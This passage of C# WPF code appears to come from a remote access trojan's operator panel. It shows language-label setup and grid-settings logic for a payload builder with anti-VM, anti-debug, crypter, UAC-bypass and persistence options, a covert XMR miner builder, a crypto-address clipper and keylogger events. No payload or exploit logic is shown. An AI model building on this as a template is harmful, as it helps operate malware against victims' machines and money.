        if (LblSettSoundPrefs   != null) LblSettSoundPrefs.Text   = Lang.Get("SETT_SOUND_PREFS");
        if (LblDescMaxClients   != null) LblDescMaxClients.Text   = Lang.Get("SETT_DESC_MAX_CLIENTS");
        if (BtnOpenDiagFolder   != null) BtnOpenDiagFolder.Content = Lang.Get("SETT_OPEN_FOLDER");
        if (LblSndColEvent      != null) LblSndColEvent.Text      = Lang.Get("SETT_SND_COL_EVENT");
        if (LblSndColStatus     != null) LblSndColStatus.Text     = Lang.Get("SETT_SND_COL_STATUS");
        if (LblSndColPreview    != null) LblSndColPreview.Text    = Lang.Get("SETT_SND_COL_PREVIEW");

        // ── Sidebar Backup / Import buttons ──
        if (BtnBackup != null) BtnBackup.Content = Lang.Get("BTN_BACKUP");
        if (BtnImport != null) BtnImport.Content = Lang.Get("BTN_IMPORT");

        // ── Accent palette labels ──
        if (LblSettAccent   != null) LblSettAccent.Text   = Lang.Get("SETT_ACCENT_COLOR");
        if (BtnResetAccent  != null) BtnResetAccent.Content = Lang.Get("SETT_RESET_ACCENT");

        // ── Builder card headers ──
        if (BldLblConnection  != null) BldLblConnection.Text  = Lang.Get("BLD_CONNECTION");
        if (BldLblIdentity    != null) BldLblIdentity.Text    = Lang.Get("BLD_IDENTITY");
        if (BldLblHollowing   != null) BldLblHollowing.Text   = Lang.Get("BLD_HOLLOWING");
        if (BldLblProtection  != null) BldLblProtection.Text  = Lang.Get("BLD_PROTECTION");
        if (BldLblObfuscation != null) BldLblObfuscation.Text = Lang.Get("BLD_OBFUSCATION");
        if (BldLblPersistence != null) BldLblPersistence.Text = Lang.Get("BLD_PERSISTENCE");

        // ── Builder field labels ──
        if (BldLblHosts         != null) BldLblHosts.Text         = Lang.Get("BLD_LBL_HOSTS");
        if (BldLblPort          != null) BldLblPort.Text          = Lang.Get("BLD_LBL_PORT");
        if (BldLblPastebinUrl   != null) BldLblPastebinUrl.Text   = Lang.Get("BLD_LBL_PASTEBIN");
        if (BldLblClientId      != null) BldLblClientId.Text      = Lang.Get("BLD_LBL_CLIENTID");
        if (BldLblMutex         != null) BldLblMutex.Text         = Lang.Get("BLD_LBL_MUTEX");
        if (BldLblTargetProcess != null) BldLblTargetProcess.Text = Lang.Get("BLD_LBL_TARGET_PROCESS");
        if (BldLblInstallFolder != null) BldLblInstallFolder.Text = Lang.Get("BLD_LBL_INSTALL_FOLDER");
        if (BldLblInstallFile   != null) BldLblInstallFile.Text   = Lang.Get("BLD_LBL_INSTALL_FILE");

        // ── Builder checkbox content ──
        if (BldUsePastebin    != null) BldUsePastebin.Content    = Lang.Get("BLD_CHK_PASTEBIN");
        if (BldHollowing      != null) BldHollowing.Content      = Lang.Get("BLD_CHK_HOLLOW");
        if (BldSetAssembly    != null) BldSetAssembly.Content    = Lang.Get("BLD_CHK_ASSEMBLY");
        if (BldSetIcon        != null) BldSetIcon.Content        = Lang.Get("BLD_CHK_ICON");
        if (BldUseMutex       != null) BldUseMutex.Content       = Lang.Get("BLD_CHK_MUTEX");
        if (BldAntiDebug      != null) BldAntiDebug.Content      = Lang.Get("BLD_CHK_ANTIDEBUG");
        if (BldAntiVM         != null) BldAntiVM.Content         = Lang.Get("BLD_CHK_ANTIVM");
        if (BldAntiDetect     != null) BldAntiDetect.Content     = Lang.Get("BLD_CHK_ANTIDETECT");
        if (BldAntiSandbox    != null) BldAntiSandbox.Content    = Lang.Get("BLD_CHK_ANTISANDBOX");
        if (BldBlockCis       != null) BldBlockCis.Content       = Lang.Get("BLD_CHK_BLOCKCIS");
        if (BldAntiKill       != null) BldAntiKill.Content       = Lang.Get("BLD_CHK_ANTIKILL");
        if (BldEncrypt        != null) BldEncrypt.Content        = Lang.Get("BLD_CHK_CRYPTER");
        if (BldUacBypass      != null) BldUacBypass.Content      = Lang.Get("BLD_CHK_UAC");
        if (BldUpx            != null) BldUpx.Content            = Lang.Get("BLD_CHK_UPX");
        if (TxtMaxPersist     != null) TxtMaxPersist.Text        = Lang.Get("BLD_MAX_PERSIST");
        if (BldTxtUacWarning  != null) BldTxtUacWarning.Text     = Lang.Get("BLD_UAC_WARNING");

        // ── Sound event names ──
        if (SndLbl_Intro       != null) SndLbl_Intro.Text       = Lang.Get("SND_EVT_INTRO");
        if (SndLbl_Startup     != null) SndLbl_Startup.Text     = Lang.Get("SND_EVT_STARTUP");
        if (SndLbl_Shutdown    != null) SndLbl_Shutdown.Text    = Lang.Get("SND_EVT_SHUTDOWN");
        if (SndLbl_Connected   != null) SndLbl_Connected.Text   = Lang.Get("SND_EVT_CONNECTED");
        if (SndLbl_NewClient   != null) SndLbl_NewClient.Text   = Lang.Get("SND_EVT_NEWCLIENT");
        if (SndLbl_Disconnected!= null) SndLbl_Disconnected.Text= Lang.Get("SND_EVT_DISCONNECTED");
        if (SndLbl_BuildSuccess!= null) SndLbl_BuildSuccess.Text= Lang.Get("SND_EVT_BUILD_OK");
        if (SndLbl_BuildError  != null) SndLbl_BuildError.Text  = Lang.Get("SND_EVT_BUILD_ERR");
        if (SndLbl_Clipper     != null) SndLbl_Clipper.Text     = Lang.Get("SND_EVT_CLIPPER");
        if (SndLbl_Keylogger   != null) SndLbl_Keylogger.Text   = Lang.Get("SND_EVT_KEYLOGGER");
        if (SndLbl_AutoTask    != null) SndLbl_AutoTask.Text    = Lang.Get("SND_EVT_AUTOTASK");
        if (SndLbl_Download    != null) SndLbl_Download.Text    = Lang.Get("SND_EVT_DOWNLOAD");
        if (SndLbl_Upload      != null) SndLbl_Upload.Text      = Lang.Get("SND_EVT_UPLOAD");
        if (SndLbl_FileDelete  != null) SndLbl_FileDelete.Text  = Lang.Get("SND_EVT_FILEDELETE");

        // ── Sound row "Enabled" checkbox labels ──
        if (SndChkLbl_Intro       != null) SndChkLbl_Intro.Text       = Lang.Get("SND_ENABLED");
        if (SndChkLbl_Startup     != null) SndChkLbl_Startup.Text     = Lang.Get("SND_ENABLED");
        if (SndChkLbl_Shutdown    != null) SndChkLbl_Shutdown.Text    = Lang.Get("SND_ENABLED");
        if (SndChkLbl_Connected   != null) SndChkLbl_Connected.Text   = Lang.Get("SND_ENABLED");
        if (SndChkLbl_NewClient   != null) SndChkLbl_NewClient.Text   = Lang.Get("SND_ENABLED");
        if (SndChkLbl_Disconnected!= null) SndChkLbl_Disconnected.Text= Lang.Get("SND_ENABLED");
        if (SndChkLbl_BuildSuccess!= null) SndChkLbl_BuildSuccess.Text= Lang.Get("SND_ENABLED");
        if (SndChkLbl_BuildError  != null) SndChkLbl_BuildError.Text  = Lang.Get("SND_ENABLED");
        if (SndChkLbl_Clipper     != null) SndChkLbl_Clipper.Text     = Lang.Get("SND_ENABLED");
        if (SndChkLbl_Keylogger   != null) SndChkLbl_Keylogger.Text   = Lang.Get("SND_ENABLED");
        if (SndChkLbl_AutoTask    != null) SndChkLbl_AutoTask.Text    = Lang.Get("SND_ENABLED");
        if (SndChkLbl_Download    != null) SndChkLbl_Download.Text    = Lang.Get("SND_ENABLED");
        if (SndChkLbl_Upload      != null) SndChkLbl_Upload.Text      = Lang.Get("SND_ENABLED");
        if (SndChkLbl_FileDelete  != null) SndChkLbl_FileDelete.Text  = Lang.Get("SND_ENABLED");

        // ── Sound row "Play" button labels ──
        if (SndPlyLbl_Intro       != null) SndPlyLbl_Intro.Text       = Lang.Get("SND_PLAY");
        if (SndPlyLbl_Startup     != null) SndPlyLbl_Startup.Text     = Lang.Get("SND_PLAY");
        if (SndPlyLbl_Shutdown    != null) SndPlyLbl_Shutdown.Text    = Lang.Get("SND_PLAY");
        if (SndPlyLbl_Connected   != null) SndPlyLbl_Connected.Text   = Lang.Get("SND_PLAY");
        if (SndPlyLbl_NewClient   != null) SndPlyLbl_NewClient.Text   = Lang.Get("SND_PLAY");
        if (SndPlyLbl_Disconnected!= null) SndPlyLbl_Disconnected.Text= Lang.Get("SND_PLAY");
        if (SndPlyLbl_BuildSuccess!= null) SndPlyLbl_BuildSuccess.Text= Lang.Get("SND_PLAY");
        if (SndPlyLbl_BuildError  != null) SndPlyLbl_BuildError.Text  = Lang.Get("SND_PLAY");
        if (SndPlyLbl_Clipper     != null) SndPlyLbl_Clipper.Text     = Lang.Get("SND_PLAY");
        if (SndPlyLbl_Keylogger   != null) SndPlyLbl_Keylogger.Text   = Lang.Get("SND_PLAY");
        if (SndPlyLbl_AutoTask    != null) SndPlyLbl_AutoTask.Text    = Lang.Get("SND_PLAY");
        if (SndPlyLbl_Download    != null) SndPlyLbl_Download.Text    = Lang.Get("SND_PLAY");
        if (SndPlyLbl_Upload      != null) SndPlyLbl_Upload.Text      = Lang.Get("SND_PLAY");
        if (SndPlyLbl_FileDelete  != null) SndPlyLbl_FileDelete.Text  = Lang.Get("SND_PLAY");

        // ── AutoTask panel buttons ──
        if (AtBtnAddFileTxt != null) AtBtnAddFileTxt.Text = Lang.Get("AT_ADD_FILE");
        if (AtBtnExclCTxt   != null) AtBtnExclCTxt.Text   = Lang.Get("AT_EXCL_C");
        if (AtBtnDisUacTxt  != null) AtBtnDisUacTxt.Text  = Lang.Get("AT_DIS_UAC");
        if (AtBtnBlkAvTxt   != null) AtBtnBlkAvTxt.Text   = Lang.Get("AT_BLK_AV");
        if (AtBtnBlkRstTxt  != null) AtBtnBlkRstTxt.Text  = Lang.Get("AT_BLK_RST");
        if (AtBtnBotKillTxt != null) AtBtnBotKillTxt.Text = Lang.Get("AT_BOTKILL");
        if (AtBtnCustomTxt  != null) AtBtnCustomTxt.Text  = Lang.Get("AT_CUSTOM");
        if (AtBtnRemoveTxt  != null) AtBtnRemoveTxt.Text  = Lang.Get("AT_REMOVE");
        if (AtHintText      != null) AtHintText.Text       = Lang.Get("AT_EXEC_HINT");

        // ── AutoTask description text (previously hardcoded French) ──
        if (AtRunDesc1 != null) AtRunDesc1.Text = Lang.Get("AT_DESC1");
        if (AtRunOnce  != null) AtRunOnce.Text  = Lang.Get("AT_ONCE");
        if (AtRunDesc2 != null) AtRunDesc2.Text = Lang.Get("AT_DESC2");

        // ── Search bar placeholders (via Tag binding in the TextBox template) ──
        if (TxtSearch           != null) TxtSearch.Tag           = Lang.Get("SEARCH_HINT_ONLINE");
        if (TxtAllClientsSearch != null) TxtAllClientsSearch.Tag = Lang.Get("SEARCH_HINT_ALL_CLIENTS");

        // ── Dashboard "Last updated" label ──
        if (DashLblLastUpdated != null) DashLblLastUpdated.Text = Lang.Get("DASH_LAST_UPDATED");

        // ── AutoTask DataGrid column headers ──
        UpdateColHeader(GridAutoTasks, "NAME",       Lang.Get("AT_COL_NAME"));
        UpdateColHeader(GridAutoTasks, "TYPE",       Lang.Get("AT_COL_TYPE"));
        UpdateColHeader(GridAutoTasks, "SIZE",       Lang.Get("AT_COL_SIZE"));
        UpdateColHeader(GridAutoTasks, "EXECUTIONS", Lang.Get("AT_COL_EXEC"));
        UpdateColHeader(GridAutoTasks, "ADDED",      Lang.Get("AT_COL_ADDED"));

        // ── Empty state placeholder ──
        if (TxtNoRecords    != null) TxtNoRecords.Text    = Lang.Get("NO_RECORDS");
        if (BtnClearOffline != null) BtnClearOffline.Content = $"\U0001F5D1  {Lang.Get("CLEAR_OFFLINE")}";
        if (TxtAllClientsCount != null && _store != null)
            TxtAllClientsCount.Text = $"{_store.AllClients.Count} {Lang.Get("RECORDS_COUNT")}";

        // ── Empty state ──
        if (TxtNoClientsConnected != null) TxtNoClientsConnected.Text = Lang.Get("NO_CLIENTS");

        // ── Grid filter labels ──
        if (TxtFilterAdminOnly     != null) TxtFilterAdminOnly.Text     = Lang.Get("FILTER_ADMIN_ONLY");

        // ── Grid Settings panel ──
        if (TxtGridSettingsTitle   != null) TxtGridSettingsTitle.Text   = Lang.Get("GRID_SETTINGS");
        if (TxtGridFiltersLabel    != null) TxtGridFiltersLabel.Text    = Lang.Get("FILTERS");
        if (TxtWebcamOnly          != null) TxtWebcamOnly.Text          = Lang.Get("WEBCAM_ONLY");
        if (TxtAutoFill            != null) TxtAutoFill.Text            = Lang.Get("AUTO_FIT_COLUMNS");
        if (TxtGridColVis          != null) TxtGridColVis.Text          = Lang.Get("COLUMN_VIS");
        if (BtnResetGridSettings   != null) BtnResetGridSettings.Content = Lang.Get("RESET_GRID");
        if (TxtAllClientsSettingsTitle != null) TxtAllClientsSettingsTitle.Text    = Lang.Get("GRID_SETTINGS");
        if (TxtAllClientsColVis        != null) TxtAllClientsColVis.Text           = Lang.Get("COLUMN_VIS");
        if (BtnResetAllClientsSettings != null) BtnResetAllClientsSettings.Content = Lang.Get("RESET_GRID");
        PopulateColumnVisibilityMenu();
        PopulateAllClientsColumnVisibilityMenu();

        // ── Server status (refresh current state text) ──
        if (TxtServerStatus != null)
            TxtServerStatus.Text = (_server?.IsRunning == true)
                ? Lang.Get("SERVER_LISTENING")
                : Lang.Get("SERVER_STOPPED");
        if (BtnStartStop != null)
            BtnStartStop.Content = (_server != null ? Lang.Get("ACT_STOP") : Lang.Get("ACT_START")).ToUpper();

        // ── Settings / builder buttons ──
        if (BtnApplyMaxClients != null) BtnApplyMaxClients.Content = Lang.Get("BTN_APPLY");
        if (BtnApplyDiscord    != null) BtnApplyDiscord.Content    = Lang.Get("BTN_APPLY");
        if (BtnCheckPort       != null) BtnCheckPort.Content       = Lang.Get("BTN_CHECK");
        if (BtnGetIp           != null) BtnGetIp.Content           = Lang.Get("BTN_GET_IP");
        if (BtnBldSave         != null) BtnBldSave.Content         = Lang.Get("BTN_SAVE");
        if (BtnBldCheckAll     != null) BtnBldCheckAll.Content     = Lang.Get("BTN_CHECK_ALL");

        // ── Window Notify context menu ──
        if (MnuWnGoToClient    != null) MnuWnGoToClient.Header    = Lang.Get("WN_GO_TO_CLIENT");
        if (MnuWnClearSelected != null) MnuWnClearSelected.Header = Lang.Get("WN_CLEAR_SELECTED");

        // ── Builder checkbox tooltips ──
        if (BldAntiDebug   != null) BldAntiDebug.ToolTip   = Lang.Get("BLD_TT_ANTIDEBUG");
        if (BldAntiVM      != null) BldAntiVM.ToolTip      = Lang.Get("BLD_TT_ANTIVM");
        if (BldAntiDetect  != null) BldAntiDetect.ToolTip  = Lang.Get("BLD_TT_ANTIDETECT");
        if (BldBlockCis    != null) BldBlockCis.ToolTip    = Lang.Get("BLD_TT_BLOCKCIS");
        if (BldAntiSandbox != null) BldAntiSandbox.ToolTip = Lang.Get("BLD_TT_ANTISANDBOX");
        if (BldAntiKill    != null) BldAntiKill.ToolTip    = Lang.Get("BLD_TT_ANTIKILL");

        // ── XMR Miner section/field labels ──
        if (MnrLblBinary       != null) MnrLblBinary.Text       = Lang.Get("MNR_SEC_BINARY");
        if (MnrSecNetwork      != null) MnrSecNetwork.Text      = Lang.Get("MNR_SEC_NETWORK");
        if (MnrLblPool         != null) MnrLblPool.Text         = Lang.Get("MNR_LBL_POOL");
        if (MnrLblWallet       != null) MnrLblWallet.Text       = Lang.Get("MNR_LBL_WALLET");
        if (MnrLblPass         != null) MnrLblPass.Text         = Lang.Get("MNR_LBL_PASS");
        if (MnrLblAlgo         != null) MnrLblAlgo.Text         = Lang.Get("MNR_LBL_ALGO");
        if (MnrLblWorker       != null) MnrLblWorker.Text       = Lang.Get("MNR_LBL_WORKER");
        if (MnrSecCpu          != null) MnrSecCpu.Text          = Lang.Get("MNR_SEC_CPU");
        if (MnrLblCpuIdle      != null) MnrLblCpuIdle.Text      = Lang.Get("MNR_LBL_CPU_IDLE");
        if (MnrLblCpuActive    != null) MnrLblCpuActive.Text    = Lang.Get("MNR_LBL_CPU_ACTIVE");
        if (MnrLblIdleSec      != null) MnrLblIdleSec.Text      = Lang.Get("MNR_LBL_IDLE_SEC");
        if (MnrSecDeploy       != null) MnrSecDeploy.Text       = Lang.Get("MNR_SEC_DEPLOY");
        if (MnrLblInstall      != null) MnrLblInstall.Text      = Lang.Get("MNR_LBL_INSTALL");
        if (MnrSecProtection   != null) MnrSecProtection.Text   = Lang.Get("MNR_SEC_PROTECTION");
        if (MnrLblHollowTarget != null) MnrLblHollowTarget.Text = Lang.Get("MNR_LBL_HOLLOW");
        if (MnrSecBuild        != null) MnrSecBuild.Text        = Lang.Get("MNR_SEC_BUILD");
        if (MnrLblStatsPort    != null) MnrLblStatsPort.Text   = Lang.Get("MNR_LBL_STATS_PORT");
        if (BldMnrStatsInfo    != null) BldMnrStatsInfo.Text    = Lang.Get("MNR_STATS_INFO");

        // ── XMR Miner checkboxes ──
        if (BldMnrTls          != null) BldMnrTls.Content          = Lang.Get("MNR_CHK_TLS");
        if (BldMnrStealth      != null) BldMnrStealth.Content      = Lang.Get("MNR_CHK_STEALTH");
        if (BldMnrDisableSleep != null) BldMnrDisableSleep.Content = Lang.Get("MNR_CHK_SLEEP");
        if (BldMnrStartup      != null) BldMnrStartup.Content      = Lang.Get("MNR_CHK_STARTUP");
        if (BldMnrSafeBoot     != null) BldMnrSafeBoot.Content     = Lang.Get("MNR_CHK_SAFEBOOT");
        if (BldMnrWatchdog     != null) BldMnrWatchdog.Content     = Lang.Get("MNR_CHK_WATCHDOG");
        if (BldMnrBotKiller    != null) BldMnrBotKiller.Content    = Lang.Get("MNR_CHK_BOTKILLER");
        if (BldMnrHollow       != null) BldMnrHollow.Content       = Lang.Get("MNR_CHK_HOLLOW");
        if (BldMnrEncrypt      != null) BldMnrEncrypt.Content      = Lang.Get("MNR_CHK_CRYPTER");
        if (BldMnrUpx          != null) BldMnrUpx.Content          = Lang.Get("MNR_CHK_UPX");

        // ── XMR Miner buttons ──
        if (BtnMnrBuild      != null) BtnMnrBuild.Content      = Lang.Get("MNR_BTN_BUILD");
        if (BtnMnrSaveConfig != null) BtnMnrSaveConfig.Content = Lang.Get("MNR_BTN_SAVE_CFG");
        if (BtnMnrLoadConfig != null) BtnMnrLoadConfig.Content = Lang.Get("MNR_BTN_LOAD_CFG");
        if (BldMnrXmrigPath  != null && _bldXmrigBytes == null) BldMnrXmrigPath.Text = Lang.Get("MNR_XMRIG_MISSING");

        // ── Screen buttons ──
        if (BtnScreenStart != null) BtnScreenStart.Content = Lang.Get("ACT_START").ToUpper();
        if (BtnScreenStop  != null) BtnScreenStop.Content  = Lang.Get("ACT_STOP").ToUpper();

        // ── Clipper labels and buttons ──
        if (LblClipperTitle        != null) LblClipperTitle.Text        = Lang.Get("CLR_TITLE");
        if (LblClipperSubtitle     != null) LblClipperSubtitle.Text     = Lang.Get("CLR_SUBTITLE");
        if (LblClipperIntercepting != null) LblClipperIntercepting.Text = Lang.Get("CLR_INTERCEPTING");
        if (BtnClipperStart        != null) BtnClipperStart.Content     = Lang.Get("ACT_START").ToUpper();
        if (BtnClipperStop         != null) BtnClipperStop.Content      = Lang.Get("ACT_STOP").ToUpper();
        if (BtnClipperSave         != null) BtnClipperSave.Content      = "💾 " + Lang.Get("ACT_SAVE");
        if (LblClipperIntLog       != null) LblClipperIntLog.Text       = Lang.Get("BND_INTERCEPT");
        if (BtnClipperClear        != null) BtnClipperClear.Content     = Lang.Get("ACT_CLEAR");
        if (LblClipperDestAddr     != null) LblClipperDestAddr.Text     = Lang.Get("BND_DEST_ADDR");

        // ── RAT builder + Binder build buttons ──
        if (TxtBtnBuild       != null) TxtBtnBuild.Text       = Lang.Get("ACT_BUILD").ToUpper();
        if (BtnBinderBuildTxt != null) BtnBinderBuildTxt.Text = Lang.Get("ACT_BUILD");
    }

    // Maps DataGridTextColumn instance → original English header so we can always re-match
    private static readonly Dictionary<System.Windows.Controls.DataGridTextColumn, string>
        _colOriginalHeader = new();

    // Updates a DataGridTextColumn header by original English header text
    private static void UpdateColHeader(System.Windows.Controls.DataGrid grid, string originalHeader, string newHeader)
    {
        foreach (var col in grid.Columns)
        {
            if (col is not System.Windows.Controls.DataGridTextColumn tc) continue;

            // Register original header on first call (before any translation)
            if (!_colOriginalHeader.TryGetValue(tc, out var orig))
            {
                orig = tc.Header?.ToString() ?? "";
                _colOriginalHeader[tc] = orig;
            }

            if (string.Equals(orig, originalHeader, StringComparison.OrdinalIgnoreCase))
            {
                tc.Header = newHeader;
                return;
            }
        }
    }

    private void SettingsLanguage_Changed(object sender, SelectionChangedEventArgs e)
    {
        if (!IsLoaded || _langSyncing) return;
        if (SettingsLanguage.SelectedItem is System.Windows.Controls.ComboBoxItem item
            && item.Tag is string tag)
        {
            UiPrefs.Set("Language", tag);
            Lang.SetLanguage(tag);
            ApplyLanguage();
        }
    }

    // --- Grid Visibility, Filters, and Tag Customizations ---
    private bool _webcamFilterOnly = false;
    private bool _adminFilterOnly = false;
    private bool _suppressColumnSave = false;
    private bool _suppressCheckboxUpdate = false;
    private bool _autoFitColumns = false;

    private readonly List<(System.ComponentModel.DependencyPropertyDescriptor dpd, System.Windows.DependencyObject obj, EventHandler h)>
        _columnPersistenceHandlers = new();

    private void CleanupColumnPersistence()
    {
        foreach (var (dpd, obj, h) in _columnPersistenceHandlers)
            dpd.RemoveValueChanged(obj, h);
        _columnPersistenceHandlers.Clear();
    }

    private void LoadColumnVisibility()
    {
        foreach (var col in GridClients.Columns)
        {
            string key = GetOriginalKey(col); // always English regardless of current language
            if (string.IsNullOrEmpty(key) || key == "TAG") continue;

            int isVisible = UiPrefs.GetInt($"ColVis_{key}", 1);
            col.Visibility = isVisible == 1 ? Visibility.Visible : Visibility.Collapsed;
        }
        foreach (var col in GridAllClients.Columns)
        {
            string key = GetOriginalKey(col);
            if (string.IsNullOrEmpty(key) || key == "TAG") continue;

            int isVisible = UiPrefs.GetInt($"AllColVis_{key}", 1);
            col.Visibility = isVisible == 1 ? Visibility.Visible : Visibility.Collapsed;
        }
    }

    private void PopulateColumnVisibilityMenu()
    {
        if (StackColumnCheckboxes == null) return;
        StackColumnCheckboxes.Children.Clear();
        foreach (var col in GridClients.Columns)
        {
            string header = col.Header?.ToString() ?? "";
            if (string.IsNullOrEmpty(header)) continue;

            string key = GetOriginalKey(col);
            if (key == "TAG") continue; // TAG is always visible — it's the structural fill column

            var cb = new System.Windows.Controls.CheckBox
            {
                Content = GetFriendlyColumnHeader(header),
                Style = (Style)FindResource("SettingsChk"),
                IsChecked = col.Visibility == Visibility.Visible,
                Tag = col,
                Margin = new Thickness(0, 0, 0, 8)
            };

            string h = key;
            cb.Checked += (s, ev) =>
            {
                if (_suppressCheckboxUpdate) return;
                _suppressColumnSave = true;
                col.Visibility = Visibility.Visible;
                _suppressColumnSave = false;
                UiPrefs.Set($"ColVis_{h}", 1);
                SaveGridColumnWidths();
            };
            cb.Unchecked += (s, ev) =>
            {
                if (_suppressCheckboxUpdate) return;
                _suppressColumnSave = true;
                col.Visibility = Visibility.Collapsed;
                _suppressColumnSave = false;
                UiPrefs.Set($"ColVis_{h}", 0);
                SaveGridColumnWidths();
            };

            StackColumnCheckboxes.Children.Add(cb);
        }
    }

    private void PopulateAllClientsColumnVisibilityMenu()
    {
        if (StackAllClientsColumnCheckboxes == null) return;
        StackAllClientsColumnCheckboxes.Children.Clear();
        foreach (var col in GridAllClients.Columns)
        {
            string key = GetOriginalKey(col);
            if (string.IsNullOrEmpty(key) || key == "TAG") continue; // TAG is always visible

            string header = col.Header?.ToString() ?? key;
            var cb = new System.Windows.Controls.CheckBox
            {
                Content = GetFriendlyColumnHeader(header),
                Style = (Style)FindResource("SettingsChk"),
                IsChecked = col.Visibility == Visibility.Visible,
                Tag = col,
                Margin = new Thickness(0, 0, 0, 8)
            };

            string h = key;
            cb.Checked += (s, ev) =>
            {
                if (_suppressCheckboxUpdate) return;
                _suppressColumnSave = true;
                col.Visibility = Visibility.Visible;
                _suppressColumnSave = false;
                UiPrefs.Set($"AllColVis_{h}", 1);
                SaveAllClientsColumnWidths();
            };
            cb.Unchecked += (s, ev) =>
            {
                if (_suppressCheckboxUpdate) return;
                _suppressColumnSave = true;
                col.Visibility = Visibility.Collapsed;
                _suppressColumnSave = false;
                UiPrefs.Set($"AllColVis_{h}", 0);
                SaveAllClientsColumnWidths();
            };

            StackAllClientsColumnCheckboxes.Children.Add(cb);
        }
    }

    private string GetFriendlyColumnHeader(string header)
    {
        if (header == Lang.Get("COL_USER"))    return Lang.Get("GRID_COL_USER");
        if (header == Lang.Get("COL_PRIV"))    return Lang.Get("GRID_COL_PRIV");
        if (header == Lang.Get("COL_COUNTRY")) return Lang.Get("GRID_COL_COUNTRY");
        if (header == Lang.Get("COL_MACHINE")) return Lang.Get("GRID_COL_MACHINE");
        if (header == Lang.Get("COL_AV"))      return Lang.Get("GRID_COL_AV");
        if (header == Lang.Get("COL_CAM"))     return Lang.Get("GRID_COL_CAM");
        if (header == Lang.Get("COL_WINDOW"))  return Lang.Get("GRID_COL_WINDOW");
        return header;
    }

    private void UpdateSettingsCheckboxStates()
    {
        _suppressCheckboxUpdate = true;
        try
        {
            if (StackColumnCheckboxes != null)
            {
                foreach (var child in StackColumnCheckboxes.Children)
                {
                    if (child is System.Windows.Controls.CheckBox cb && cb.Tag is System.Windows.Controls.DataGridColumn col)
                        cb.IsChecked = col.Visibility == Visibility.Visible;
                }
            }

            if (StackAllClientsColumnCheckboxes != null)
            {
                foreach (var child in StackAllClientsColumnCheckboxes.Children)
                {
                    if (child is System.Windows.Controls.CheckBox cb && cb.Tag is System.Windows.Controls.DataGridColumn col)
                        cb.IsChecked = col.Visibility == Visibility.Visible;
                }
            }

            if (ChkFilterWebcam != null) ChkFilterWebcam.IsChecked = _webcamFilterOnly;
            if (ChkFilterAdmin != null) ChkFilterAdmin.IsChecked = _adminFilterOnly;
            if (ChkAutoFill != null) ChkAutoFill.IsChecked = _autoFitColumns;
        }
        finally { _suppressCheckboxUpdate = false; }
    }

    private void BtnGridSettings_Click(object sender, RoutedEventArgs e)
    {
        if (GridSettingsPanel == null) return;
        if (GridSettingsPanel.Visibility == Visibility.Visible)
            SlideOutGridSettings();
        else
        {
            UpdateSettingsCheckboxStates();
            SlideInGridSettings();
        }
    }

    private void CloseGridSettings_Click(object sender, RoutedEventArgs e)
    {
        if (GridSettingsPanel != null)
            SlideOutGridSettings();
    }

    private void SlideInGridSettings()
    {
        var tx = (System.Windows.Media.TranslateTransform)GridSettingsPanel.RenderTransform;
        tx.X = 260;
        GridSettingsPanel.Visibility = Visibility.Visible;
        var anim = new System.Windows.Media.Animation.DoubleAnimation(0, TimeSpan.FromMilliseconds(200))
        {
            EasingFunction = new System.Windows.Media.Animation.CubicEase { EasingMode = System.Windows.Media.Animation.EasingMode.EaseOut }
        };
        tx.BeginAnimation(System.Windows.Media.TranslateTransform.XProperty, anim);
    }

    private void SlideOutGridSettings()
    {
        var tx = (System.Windows.Media.TranslateTransform)GridSettingsPanel.RenderTransform;
        var anim = new System.Windows.Media.Animation.DoubleAnimation(260, TimeSpan.FromMilliseconds(180))
        {
            EasingFunction = new System.Windows.Media.Animation.CubicEase { EasingMode = System.Windows.Media.Animation.EasingMode.EaseIn }
        };
        anim.Completed += (_, _) => GridSettingsPanel.Visibility = Visibility.Collapsed;
        tx.BeginAnimation(System.Windows.Media.TranslateTransform.XProperty, anim);
    }

    private void BtnAllClientsSettings_Click(object sender, RoutedEventArgs e)
    {
        if (AllClientsSettingsPanel == null) return;
        if (AllClientsSettingsPanel.Visibility == Visibility.Visible)
            SlideOutAllClientsSettings();
        else
        {
            UpdateSettingsCheckboxStates();
            SlideInAllClientsSettings();
        }
    }

    private void CloseAllClientsSettings_Click(object sender, RoutedEventArgs e)
    {
        if (AllClientsSettingsPanel != null)
            SlideOutAllClientsSettings();
    }

    private void SlideInAllClientsSettings()
    {
        var tx = (System.Windows.Media.TranslateTransform)AllClientsSettingsPanel.RenderTransform;
        tx.X = 260;
        AllClientsSettingsPanel.Visibility = Visibility.Visible;
        var anim = new System.Windows.Media.Animation.DoubleAnimation(0, TimeSpan.FromMilliseconds(200))
        {
            EasingFunction = new System.Windows.Media.Animation.CubicEase { EasingMode = System.Windows.Media.Animation.EasingMode.EaseOut }
        };
        tx.BeginAnimation(System.Windows.Media.TranslateTransform.XProperty, anim);
    }

    private void SlideOutAllClientsSettings()
    {
        var tx = (System.Windows.Media.TranslateTransform)AllClientsSettingsPanel.RenderTransform;
        var anim = new System.Windows.Media.Animation.DoubleAnimation(260, TimeSpan.FromMilliseconds(180))
        {
            EasingFunction = new System.Windows.Media.Animation.CubicEase { EasingMode = System.Windows.Media.Animation.EasingMode.EaseIn }
        };
        anim.Completed += (_, _) => AllClientsSettingsPanel.Visibility = Visibility.Collapsed;
        tx.BeginAnimation(System.Windows.Media.TranslateTransform.XProperty, anim);
    }

    private void ResetAllClientsSettings_Click(object sender, RoutedEventArgs e)
    {
        bool hasChanges = GridAllClients.Columns.Any(c => c.Visibility != Visibility.Visible);
        if (!hasChanges)
        {
            double gw = GridAllClients.ActualWidth;
            if (gw >= 50)
            {
                double avail = gw - 8.0 - 60.0;
                const double kF = 1004.0, kM = 763.0;
                double t = avail >= kF ? 1.0 : avail >= kM ? (avail - kM) / (kF - kM) : 0.0;
                foreach (var col in GridAllClients.Columns)
                {
                    if (col.Visibility != Visibility.Visible) { hasChanges = true; break; }
                    string k = GetOriginalKey(col);
                    if (string.IsNullOrEmpty(k) || k == "TAG") continue;
                    if (_allClientsColSpec.TryGetValue(k, out var spec))
                    {
                        int ep = (int)Math.Round(spec.min + (spec.full - spec.min) * t);
                        if (col.Width.UnitType != DataGridLengthUnitType.Pixel || Math.Abs(col.Width.Value - ep) > 2.0)
                        { hasChanges = true; break; }
                    }
                }
            }
            else { hasChanges = true; }
        }

        if (!hasChanges) return;

        _suppressColumnSave = true;
        try
        {
            foreach (var col in GridAllClients.Columns)
            {
                string key = GetOriginalKey(col);
                if (!string.IsNullOrEmpty(key))
                {
                    col.Visibility = Visibility.Visible;
                    if (key != "TAG") UiPrefs.Set($"AllColVis_{key}", 1);
                }
            }
        }
        finally { _suppressColumnSave = false; }

